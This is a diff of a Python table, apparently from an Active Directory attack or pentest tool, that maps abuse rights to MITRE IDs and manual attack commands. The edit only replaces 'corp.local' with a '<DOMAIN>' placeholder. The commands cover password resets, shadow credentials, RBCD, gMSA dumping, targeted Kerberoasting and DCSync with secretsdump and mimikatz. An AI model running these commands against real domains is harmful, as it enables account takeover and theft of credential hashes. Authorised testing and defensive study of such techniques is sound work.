@@ -50,7 +50,7 @@ ABUSE_RIGHTS: dict[str, AbuseRight] = {
             "Full control — reset password, modify SPN, shadow creds, or group membership."
         ),
         manual_commands=(
-            "bloodyAD --host <DC> -d corp.local -u user -p pass set password <target> <newpass>",
+            "bloodyAD --host <DC> -d <DOMAIN> -u user -p pass set password <target> <newpass>",
             "dacledit.py -action write -rights FullControl ...",
         ),
     ),
@@ -61,7 +61,7 @@ ABUSE_RIGHTS: dict[str, AbuseRight] = {
         mitre_id="T1098",
         exploit_summary="Write object attributes — shadow credentials, SPN, or RBCD fields.",
         manual_commands=(
-            "pywhisker -d corp.local -u user -p pass --target <target> -a add",
+            "pywhisker -d <DOMAIN> -u user -p pass --target <target> -a add",
             "rbcd.py -action write -delegate-from <computer$> -delegate-to <target>",
         ),
     ),
@@ -94,8 +94,8 @@ ABUSE_RIGHTS: dict[str, AbuseRight] = {
         mitre_id="T1098",
         exploit_summary="Set a new password on the target user without knowing the old one.",
         manual_commands=(
-            "net rpc password <target> <newpass> -U corp.local/user%pass -S <DC>",
-            "bloodyAD --host <DC> -d corp.local -u user -p pass set password <target> <newpass>",
+            "net rpc password <target> <newpass> -U <DOMAIN>/user%pass -S <DC>",
+            "bloodyAD --host <DC> -d <DOMAIN> -u user -p pass set password <target> <newpass>",
         ),
     ),
     "addmember": AbuseRight(
@@ -139,7 +139,7 @@ ABUSE_RIGHTS: dict[str, AbuseRight] = {
         exploit_summary="Read gMSA managed password hash for service account takeover.",
         manual_commands=(
             "nxc ldap <DC> -u user -p pass --gmsa",
-            "gMSADumper.py -u user -p pass -d corp.local",
+            "gMSADumper.py -u user -p pass -d <DOMAIN>",
         ),
     ),
     "writespn": AbuseRight(
@@ -149,7 +149,7 @@ ABUSE_RIGHTS: dict[str, AbuseRight] = {
         mitre_id="T1558",
         exploit_summary="Set servicePrincipalName on target user for Kerberoast / targeted roast.",
         manual_commands=(
-            "targetedKerberoast.py -d corp.local -u user -p pass --targets <target>",
+            "targetedKerberoast.py -d <DOMAIN> -u user -p pass --targets <target>",
             "Set-DomainObject -Identity <target> -SET @{serviceprincipalname=...}",
         ),
     ),
@@ -160,8 +160,8 @@ ABUSE_RIGHTS: dict[str, AbuseRight] = {
         mitre_id="T1003.006",
         exploit_summary="Replicate domain password hashes (GetChanges + GetChangesAll on domain).",
         manual_commands=(
-            "secretsdump.py corp.local/user:pass@<DC> -just-dc",
-            "mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt",
+            "secretsdump.py <DOMAIN>/user:pass@<DC> -just-dc",
+            "mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:krbtgt",
         ),
     ),
     "owns": AbuseRight(
